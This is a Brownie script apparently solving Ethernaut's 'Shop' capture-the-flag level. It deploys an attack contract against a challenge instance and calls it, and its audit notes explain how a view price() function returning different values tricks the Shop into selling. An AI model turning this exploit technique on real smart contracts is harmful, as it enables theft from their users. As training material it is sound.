from scripts.helpful_scripts import get_account
from brownie import web3, interface, convert, Attack21
from eth_utils import keccak


ETHERNAUT_INSTANCE = "0x6870B6aEDBde8ccAe9694B271b8A32f44A274A42"
GAS_LIMIT = 6000000


def main():

    player = get_account()
    target = interface.IShop(ETHERNAUT_INSTANCE)
    attack = Attack21.deploy(ETHERNAUT_INSTANCE, {"from": player})

    sold_flag = target.isSold.call({"from": player})
    print(f"\nisSold = {sold_flag}\n")

    attack.attack({"from": player})

    sold_flag = target.isSold.call({"from": player})
    print(f"\nis the item sold : {sold_flag}\n")

    attack.attack({"from": player})


""" 
    Audit notes:

    - Shop expects to be called from a Buyer
        -- use the price() function to launch the attack?
    
    - make the following == True to win:
        -- (_buyer.price() >= price && !isSold) 
        -- where _buyer.price() calls the price() function in Attack21

    - price() view only, but we can still return different uint values

    - challenge puts no restriction on number of times we can attempt to win

"""
